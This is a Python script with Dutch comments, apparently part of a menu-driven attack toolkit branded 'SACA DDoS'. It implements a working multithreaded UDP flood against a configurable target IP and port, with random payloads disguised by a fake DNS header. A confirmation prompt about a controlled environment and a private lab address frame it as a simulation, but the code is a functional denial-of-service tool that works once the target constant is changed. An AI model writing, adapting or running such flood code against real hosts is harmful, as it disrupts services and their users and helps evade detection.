#!/usr/bin/env python3
import socket
import time
import threading
import random
import sys
import signal
import os
from colorama import init, Fore, Back, Style

# Initialiseer colorama
init(autoreset=True)

# ──────────────────────────────────────────────────────────────────────────────
# ASCII BANNER
# ──────────────────────────────────────────────────────────────────────────────
BANNER = r"""
>>===================================================================<<
||                                                                   ||
||   _____         _____                 _____  _____        _____   ||
||  / ____|  /\   / ____|   /\          |  __ \|  __ \      / ____|  ||
|| | (___   /  \ | |       /  \         | |  | | |  | | ___| (___    ||
||  \___ \ / /\ \| |      / /\ \        | |  | | |  | |/ _ \\___ \   ||
||  ____) / ____ \ |____ / ____ \       | |__| | |__| | (_) |___) |  ||
|| |_____/_/    \_\_____/_/    \_\      |_____/|_____/ \___/_____/   ||
||                                                                   ||
>>===================================================================<<
"""


def clear_screen():
    """Clear the terminal screen."""
    os.system("cls" if os.name == "nt" else "clear")


def display_banner():
    """Print de banner gecentreerd en in kleur."""
    try:
        width = os.get_terminal_size().columns
    except OSError:
        width = 80  # fallback

    for line in BANNER.splitlines():
        print(
            Style.BRIGHT + Fore.RED + Back.BLACK + line.center(width) + Style.RESET_ALL
        )
    print(Style.BRIGHT + Back.BLACK + " " * width + Style.RESET_ALL)
    print(Style.RESET_ALL)


# ──────────────────────────────────────────────────────────────────────────────
# CONFIGURATIE
# ──────────────────────────────────────────────────────────────────────────────
TARGET_IP = "192.168.160.143"  # Pas aan naar jouw testserver!
TARGET_PORT = 8080
NUM_STREAMS = 50  # Minder threads voor stabiliteit
RATE_PPS = 500  # Pakketten per seconde per thread

MIN_PAYLOAD_SIZE = 1024
MAX_PAYLOAD_SIZE = 1500
CAMOUFLAGE_DNS = True

stop_event = threading.Event()


def handle_exit(signum, frame):
    """Ctrl+C: stop aanval en keer terug naar hoofdmenu."""
    print("\n[!] DDoS-aanval gestopt. Terug naar hoofdmenu...")
    stop_event.set()
    sys.exit(2)  # Speciale exitcode voor hoofdscript


signal.signal(signal.SIGINT, handle_exit)


def bevestig_veilige_omgeving():
    """Dubbele bevestiging voor veiligheid"""
    confirm = input("Bevestig dat je in een gecontroleerde omgeving werkt (ja/nee): ")
    if confirm.strip().lower() != "ja":
        print(
            "[!] Uitvoering geannuleerd. Zorg dat je in een veilige testomgeving zit."
        )
        sys.exit(0)
    print("\n[!] WAARSCHUWING: Dit script kan netwerkverkeer genereren!")
    print("1) Start aanval")
    print("99) Terug naar hoofdmenu")
    keuze = input("Keuze: ")
    if keuze.strip() != "1":
        print("[!] Annulering bevestigd. Terug naar hoofdmenu.")
        sys.exit(0)


def flood():
    """Verstuurt UDP-pakketten met random payload"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        while not stop_event.is_set():
            size = random.randint(MIN_PAYLOAD_SIZE, MAX_PAYLOAD_SIZE)
            payload = bytes(random.getrandbits(8) for _ in range(size))
            if CAMOUFLAGE_DNS:
                payload = b"\x00\x00\x01\x00\x00\x01" + payload
            try:
                sock.sendto(payload, (TARGET_IP, TARGET_PORT))
                if RATE_PPS > 0:
                    time.sleep(1 / RATE_PPS)
            except Exception as e:
                if not stop_event.is_set():
                    print(f"[!] Fout bij verzenden: {e}")
                break
    finally:
        sock.close()


def main():
    clear_screen()
    display_banner()
    bevestig_veilige_omgeving()
    print(f"\n[!] START DDoS SIMULATIE")
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"Threads: {NUM_STREAMS}")
    print(f"Ctrl+C om direct te stoppen\n")

    threads = []
    for _ in range(NUM_STREAMS):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while any(t.is_alive() for t in threads) and not stop_event.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        handle_exit(None, None)

    print("[!] Simulatie veilig gestopt.")


if __name__ == "__main__":
    main()
